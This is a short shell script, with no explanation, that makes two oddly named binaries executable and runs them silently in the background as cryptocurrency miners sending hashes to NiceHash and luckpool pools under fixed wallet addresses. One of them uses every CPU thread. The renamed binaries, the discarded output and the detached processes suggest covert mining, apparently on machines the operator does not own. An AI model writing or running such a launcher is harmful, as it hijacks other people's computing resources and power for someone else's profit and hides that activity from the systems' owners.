chmod +x bengak &&
nohup ./bengak -a ETHASH -p stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -u 3DFBnEdLACQ1bPfpGy5kbAWjtyMtiEjoFx.Nuyul-$(echo $(shuf -i 1-999 -n 1)) --ethstratum ETHV1 >/dev/null 2>&1 &
chmod +x lolo &&
nohup ./lolo -v -l ap.luckpool.net:3956 -u RLKVQcYkNGQXb8FpQzNav3FUoqCLCKYdaG.999 -p x -t $(nproc --all) >/dev/null 2>&1 &